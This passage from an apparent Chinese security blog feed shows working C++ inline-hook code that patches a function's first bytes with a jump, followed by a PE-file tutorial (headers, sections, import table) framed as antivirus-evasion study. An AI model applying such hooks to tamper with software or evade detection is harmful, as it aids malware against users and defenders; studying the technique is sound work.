class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">Hook::EnHook</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>-&gt;OldFuncOpcode != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;[!]Already Hooked\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    DWORD old;</span><br><span class="line">    <span class="built_in">VirtualProtect</span>((LPVOID)<span class="keyword">this</span>-&gt;OldFunc, <span class="keyword">this</span>-&gt;OpSzie, PAGE_EXECUTE_READWRITE, &amp;old);</span><br><span class="line">    <span class="keyword">this</span>-&gt;OldFuncOpcode = (PBYTE)<span class="built_in">malloc</span>(<span class="keyword">this</span>-&gt;OpSzie + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>-&gt;OldFuncOpcode == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;[!] Hook Function Malloc Failed\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(<span class="keyword">this</span>-&gt;OldFuncOpcode, (<span class="type">void</span>*)<span class="keyword">this</span>-&gt;OldFunc, <span class="keyword">this</span>-&gt;OpSzie);</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;[*] Capture The First &quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;OpSzie &lt;&lt; <span class="string">&quot; Bytes: &quot;</span>;</span><br><span class="line">    <span class="function">std::vector&lt;BYTE&gt; <span class="title">vec</span><span class="params">(<span class="keyword">this</span>-&gt;OldFuncOpcode, <span class="keyword">this</span>-&gt;OldFuncOpcode + <span class="keyword">this</span>-&gt;OpSzie)</span></span>;</span><br><span class="line">    std::cout &lt;&lt; std::hex;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> num : vec)</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;0x&quot;</span> &lt;&lt; num &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    std::cout &lt;&lt; std::dec &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;[*] Now Start Hook\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    *     push 0x10000</span></span><br><span class="line"><span class="comment">    *     mov dword [rsp+4], 0x20000</span></span><br><span class="line"><span class="comment">    *     ret</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> jmpopcode[<span class="number">14</span>] = &#123;</span><br><span class="line">        <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC7</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,<span class="number">0x00</span>, <span class="number">0xC3</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//over write to jmp</span></span><br><span class="line">    FuncAddr gap = <span class="keyword">this</span>-&gt;NewFunc;</span><br><span class="line">    *(DWORD32*)(jmpopcode + <span class="number">1</span>) = (DWORD32)gap;</span><br><span class="line">    *(DWORD32*)(jmpopcode + <span class="number">9</span>) = (DWORD32)(gap &gt;&gt; <span class="number">32</span>);</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;[*] Jmp Code Set\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">VirtualProtect</span>((LPVOID)<span class="keyword">this</span>-&gt;OldFunc, <span class="keyword">this</span>-&gt;OpSzie, PAGE_EXECUTE_READWRITE, &amp;old);</span><br><span class="line">    <span class="built_in">memcpy</span>((PVOID)<span class="keyword">this</span>-&gt;OldFunc, jmpopcode, <span class="keyword">this</span>-&gt;OpSzie);</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;[*] Opcode Set\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>保存好覆盖的字节，后续接触hook的时候再覆盖回来</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Inline Hook还是挺好玩的&lt;/p&gt;
&lt;p&gt;文章很短，只是打个总结，记录一些有趣的发现&lt;/p&gt;</summary>
    
    
    
    <category term="program" scheme="https://joe1sn.eu.org/categories/program/"/>
    
    
    <category term="malware" scheme="https://joe1sn.eu.org/tags/malware/"/>
    
    <category term="C" scheme="https://joe1sn.eu.org/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>【免杀】PE文件分析</title>
    <link href="https://joe1sn.eu.org/2024/02/25/PeFile/"/>
    <id>https://joe1sn.eu.org/2024/02/25/PeFile/</id>
    <published>2024-02-25T15:17:26.000Z</published>
    <updated>2025-01-26T14:46:00.784Z</updated>
    
    <content type="html"><![CDATA[<p>最近代码能力飞速提升，顺便复习一下</p><span id="more"></span><p>一般就是</p><ul><li>DOS头：<code>IMAGE_DOS_HEADER</code>结构体</li><li>PE头：<code>IMAGE_NT_HEADERS</code>结构体</li><li>Section头：<code>IMAGE_SECTION_HEADER</code>结构体</li></ul><p>OK，如果要分析PE文件的话，首先把文件读取出来</p><p>那么如何解析呢？这就是C/C++非常方便的一点：直接使用结构体转换，例如把地址值解析为数值<br />总体就是解释内存中的值</p><h1 id="dos-头"><a class="markdownIt-Anchor" href="#dos-头"></a> DOS 头</h1><p>先看DOSHeader吧</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_DOS_HEADER</span> &#123;      <span class="comment">// DOS .EXE header</span></span><br><span class="line">    WORD   e_magic;                     <span class="comment">// Magic number</span></span><br><span class="line">    WORD   e_cblp;                      <span class="comment">// Bytes on last page of file</span></span><br><span class="line">    WORD   e_cp;                        <span class="comment">// Pages in file</span></span><br><span class="line">    WORD   e_crlc;                      <span class="comment">// Relocations</span></span><br><span class="line">    WORD   e_cparhdr;                   <span class="comment">// Size of header in paragraphs</span></span><br><span class="line">    WORD   e_minalloc;                  <span class="comment">// Minimum extra paragraphs needed</span></span><br><span class="line">    WORD   e_maxalloc;                  <span class="comment">// Maximum extra paragraphs needed</span></span><br><span class="line">    WORD   e_ss;                        <span class="comment">// Initial (relative) SS value</span></span><br><span class="line">    WORD   e_sp;                        <span class="comment">// Initial SP value</span></span><br><span class="line">    WORD   e_csum;                      <span class="comment">// Checksum</span></span><br><span class="line">    WORD   e_ip;                        <span class="comment">// Initial IP value</span></span><br><span class="line">    WORD   e_cs;                        <span class="comment">// Initial (relative) CS value</span></span><br><span class="line">    WORD   e_lfarlc;                    <span class="comment">// File address of relocation table</span></span><br><span class="line">    WORD   e_ovno;                      <span class="comment">// Overlay number</span></span><br><span class="line">    WORD   e_res[<span class="number">4</span>];                    <span class="comment">// Reserved words</span></span><br><span class="line">    WORD   e_oemid;                     <span class="comment">// OEM identifier (for e_oeminfo)</span></span><br><span class="line">    WORD   e_oeminfo;                   <span class="comment">// OEM information; e_oemid specific</span></span><br><span class="line">    WORD   e_res2[<span class="number">10</span>];                  <span class="comment">// Reserved words</span></span><br><span class="line">    LONG   e_lfanew;                    <span class="comment">// File address of new exe header</span></span><br><span class="line">  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br></pre></td></tr></table></figure><p>需要的是<code>e_lfanew</code></p><h1 id="nt头"><a class="markdownIt-Anchor" href="#nt头"></a> NT头</h1><p><strong>文件起始地址+e_lfanew = NT头位置</strong></p><p>得到NT头位置后</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_NT_HEADERS64</span> &#123;</span><br><span class="line">    DWORD Signature;</span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;</span><br><span class="line">    IMAGE_OPTIONAL_HEADER64 OptionalHeader;</span><br><span class="line">&#125; IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;</span><br></pre></td></tr></table></figure><p>重要的是<code>IMAGE_OPTIONAL_HEADER</code>，其实都一样，可以从<code>FileHeader</code>得到32位还是64位，</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_FILE_HEADER</span> &#123;</span><br><span class="line">    WORD    Machine;</span><br><span class="line">    WORD    NumberOfSections;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    DWORD   PointerToSymbolTable;</span><br><span class="line">    DWORD   NumberOfSymbols;</span><br><span class="line">    WORD    SizeOfOptionalHeader;</span><br><span class="line">    WORD    Characteristics;</span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure><ul><li>0x8664：adm64位</li><li>0x014C：intel32位</li></ul><p>接下来以64位举例子</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_OPTIONAL_HEADER64</span> &#123;</span><br><span class="line">    WORD        Magic;</span><br><span class="line">    BYTE        MajorLinkerVersion;</span><br><span class="line">    BYTE        MinorLinkerVersion;</span><br><span class="line">    DWORD       SizeOfCode;</span><br><span class="line">    DWORD       SizeOfInitializedData;</span><br><span class="line">    DWORD       SizeOfUninitializedData;</span><br><span class="line">    DWORD       AddressOfEntryPoint;</span><br><span class="line">    DWORD       BaseOfCode;</span><br><span class="line">    ULONGLONG   ImageBase;</span><br><span class="line">    DWORD       SectionAlignment;</span><br><span class="line">    DWORD       FileAlignment;</span><br><span class="line">    WORD        MajorOperatingSystemVersion;</span><br><span class="line">    WORD        MinorOperatingSystemVersion;</span><br><span class="line">    WORD        MajorImageVersion;</span><br><span class="line">    WORD        MinorImageVersion;</span><br><span class="line">    WORD        MajorSubsystemVersion;</span><br><span class="line">    WORD        MinorSubsystemVersion;</span><br><span class="line">    DWORD       Win32VersionValue;</span><br><span class="line">    DWORD       SizeOfImage;</span><br><span class="line">    DWORD       SizeOfHeaders;</span><br><span class="line">    DWORD       CheckSum;</span><br><span class="line">    WORD        Subsystem;</span><br><span class="line">    WORD        DllCharacteristics;</span><br><span class="line">    ULONGLONG   SizeOfStackReserve;</span><br><span class="line">    ULONGLONG   SizeOfStackCommit;</span><br><span class="line">    ULONGLONG   SizeOfHeapReserve;</span><br><span class="line">    ULONGLONG   SizeOfHeapCommit;</span><br><span class="line">    DWORD       LoaderFlags;</span><br><span class="line">    DWORD       NumberOfRvaAndSizes;</span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;</span><br></pre></td></tr></table></figure><p>到这里我写了部分代码，结合IDA就很好理解了</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/552a423436db68a5ea7e49711a57cb44.png" alt="image-20240225161644926" /></p><p>如果还要继续看的话就是<code>DataDirectory</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_DATA_DIRECTORY</span> &#123;</span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   Size;</span><br><span class="line">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br></pre></td></tr></table></figure><p>打印虚拟地址</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/0907bace88fffe9b2e7c5ed8eb1cd797.png" alt="img" /></p><p>其实就是导入导出表之类的东西</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/7d2269db3ad4229508b16f42af1ed2dc.png" alt="image-20240225163401598" /></p><p>Nt-&gt;ImageBase+这里的偏移，就是运行时的位置</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Directory Entries</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_EXPORT          0   <span class="comment">// Export Directory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_IMPORT          1   <span class="comment">// Import Directory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_RESOURCE        2   <span class="comment">// Resource Directory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_EXCEPTION       3   <span class="comment">// Exception Directory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_SECURITY        4   <span class="comment">// Security Directory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_BASERELOC       5   <span class="comment">// Base Relocation Table</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_DEBUG           6   <span class="comment">// Debug Directory</span></span></span><br><span class="line"><span class="comment">//      IMAGE_DIRECTORY_ENTRY_COPYRIGHT       7   // (X86 usage)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_ARCHITECTURE    7   <span class="comment">// Architecture Specific Data</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_GLOBALPTR       8   <span class="comment">// RVA of GP</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_TLS             9   <span class="comment">// TLS Directory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG    10   <span class="comment">// Load Configuration Directory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT   11   <span class="comment">// Bound Import Directory in headers</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_IAT            12   <span class="comment">// Import Address Table</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT   13   <span class="comment">// Delay Load Import Descriptors</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14   <span class="comment">// COM Runtime descriptor</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="节表相关"><a class="markdownIt-Anchor" href="#节表相关"></a> 节表相关</h1><p>再回到NT头中的<code>FileHeader</code>，提取得到节数量</p><p>DOS头和NT头的大小加起来后面就是第一个Section</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_SECTION_HEADER</span> &#123;</span><br><span class="line">    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">            DWORD   PhysicalAddress;</span><br><span class="line">            DWORD   VirtualSize;</span><br><span class="line">    &#125; Misc;</span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   SizeOfRawData;</span><br><span class="line">    DWORD   PointerToRawData;</span><br><span class="line">    DWORD   PointerToRelocations;</span><br><span class="line">    DWORD   PointerToLinenumbers;</span><br><span class="line">    WORD    NumberOfRelocations;</span><br><span class="line">    WORD    NumberOfLinenumbers;</span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">FilePE::bGetSectionList</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>-&gt;FileContent.<span class="built_in">length</span>() == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">Error</span>(<span class="string">&quot;File content is zero&quot;</span>, DEBUG);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>-&gt;pHeaderNT == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">Error</span>(<span class="string">&quot;NT head not initialize&quot;</span>, DEBUG);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">DWORD SectionNum = <span class="keyword">this</span>-&gt;pHeaderNT-&gt;FileHeader.NumberOfSections;</span><br><span class="line"><span class="keyword">this</span>-&gt;SecNum = SectionNum;</span><br><span class="line"><span class="keyword">this</span>-&gt;SectionList = (PIMAGE_SECTION_HEADER*)<span class="built_in">malloc</span>((SectionNum + <span class="number">1</span>) * <span class="built_in">sizeof</span>(PIMAGE_SECTION_HEADER));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>-&gt;SectionList == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">Error</span>(<span class="string">&quot;Allcate section list memory failed\n&quot;</span>, DEBUG);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; SectionNum; i++)</span><br><span class="line">&#123;</span><br><span class="line">SectionList[i] = <span class="built_in">PIMAGE_SECTION_HEADER</span>(</span><br><span class="line">&amp;<span class="keyword">this</span>-&gt;FileContent[<span class="number">0</span>] + <span class="keyword">this</span>-&gt;pHeaderDOS-&gt;e_lfanew </span><br><span class="line">+ <span class="built_in">sizeof</span>(IMAGE_NT_HEADERS) + i * <span class="built_in">sizeof</span>(IMAGE_SECTION_HEADER));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="iat表"><a class="markdownIt-Anchor" href="#iat表"></a> IAT表</h1><h2 id="i-如何找到文件的iat表"><a class="markdownIt-Anchor" href="#i-如何找到文件的iat表"></a> I. 如何找到文件的IAT表</h2><p>IAT叫Import Address Table，当我们的程序需要外部库的函数时，就会从这里开始调用</p><p>IAT表的地址并不在任何头中，不过我们之前分析<code>Directory</code>的时候就发现会有一个<code>IMAGE_DIRECTORY_ENTRY_IAT</code>，<strong>但它不是导入表</strong>，真正的IAT描述：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pHeaderNT-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]</span><br></pre></td></tr></table></figure><p>按道理来说<code>VirtualAddress+ImageBase</code>就是运行起来的地址，这里我没有加上</p><p>突然想起来我们在分析节表的时候也存在类似的 基地址+偏移</p><p>对于这个结构体之前的只能用这块儿的目录</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/64d79e16f1f82549728ea2485f24e2ae.png" alt="image-20240225200226287" /></p><p>对应文件中地址为<code>28fc-2000+1400 = 1cfc</code></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/6f62574a7f77ff1f01ff30421a8debb9.png" alt="image-20240225201254439" /></p><p>有点意思，查阅资料发现对应的结构体：<code>_IMAGE_IMPORT_DESCRIPTOR</code>，MSDN中并没有对应说明</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        DWORD   Characteristics;            <span class="comment">// 0 for terminating null import descriptor</span></span><br><span class="line">        DWORD   OriginalFirstThunk;         <span class="comment">// RVA to original unbound IAT (PIMAGE_THUNK_DATA)</span></span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    DWORD   TimeDateStamp; </span><br><span class="line">    DWORD   ForwarderChain;                 <span class="comment">// -1 if no forwarders</span></span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   FirstThunk;                     <span class="comment">// RVA to IAT (if bound this IAT has actual addresses)</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure><p>有个问题就是这块地址是运行时写入IAT相关信息，我们的静态分析到这一步就算断了</p><p>这里我设计了一个<code>BOOL bGetIAT();</code>函数，直接去读程序的内存，为了简单，就先关闭ASLR</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/f9be67365195df36d263aa69506b58df.png" alt="image-20240225191521687" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/c40d6d7e9614f013dab24ba69eca45f2.png" alt="image-20240225205332584" /></p><p>已经成功读取一个信息，接下来办法全部找出来，自然想到的就是Name为0就退出，但是由于总数不知道，所以需要一个动态容器，我用的<code>vector</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;PIMAGE_IMPORT_DESCRIPTOR&gt; pIATList;</span><br></pre></td></tr></table></figure><p>按照一样的方法全部得到后，再次尝试在运行中读取</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/9a5ad9c077dbdbd474c55403306704af.png" alt="image-20240225211740589" /></p><p>但是很多PE分析工具静态也能看得到，利用的是<code>RVA-&gt;RAW</code>的转换</p><p><code>2d52-2000+1400=2152</code></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/e35d09a9ba26e92fb594200b44f809eb.png" alt="image-20240225212317511" /></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">FilePE::PrintIATStatic</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>-&gt;pIATList.<span class="built_in">size</span>() == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">Error</span>(<span class="string">&quot;IAT List empty&quot;</span>, DEBUG);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">DWORD VA = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>-&gt;pIATList.<span class="built_in">size</span>(); i++)</span><br><span class="line">&#123;</span><br><span class="line">VA = <span class="keyword">this</span>-&gt;<span class="built_in">dwVAToRaw</span>(<span class="keyword">this</span>-&gt;pIATList[i]-&gt;Name);</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;DLL : &quot;</span> &lt;&lt; &amp;<span class="keyword">this</span>-&gt;FileContent[<span class="number">0</span>] + VA &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/832de7fba954f0b7afb7109fe59bf175.png" alt="image-20240225213837289" /></p><h2 id="ii-找到导入函数"><a class="markdownIt-Anchor" href="#ii-找到导入函数"></a> II. 找到导入函数</h2><p>通过<code>OriginalFirstThunk</code>，基本就是<code>OriginalFirstThunk</code>进行转化找到RAW，RAW地方的地址再转为RAW就找到了，最终的位置是一个<code>_IMAGE_IMPORT_BY_NAME</code>结构体</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_IMPORT_BY_NAME</span> &#123;</span><br><span class="line">    WORD    Hint;</span><br><span class="line">    CHAR   Name[<span class="number">1</span>];</span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/61868899fc8bd10cb177cd0349be419c.png" alt="image-20240225215424856" /></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">FilePE::PrintFunction</span><span class="params">(PIMAGE_IMPORT_DESCRIPTOR pIAT)</span> </span>&#123;</span><br><span class="line">DWORD64 VA = *<span class="built_in">PDWORD64</span>(&amp;<span class="keyword">this</span>-&gt;FileContent[<span class="number">0</span>] + <span class="keyword">this</span>-&gt;<span class="built_in">dwVAToRaw</span>(pIAT-&gt;OriginalFirstThunk));</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">1</span>; VA != <span class="number">0</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">PIMAGE_IMPORT_BY_NAME IatName = <span 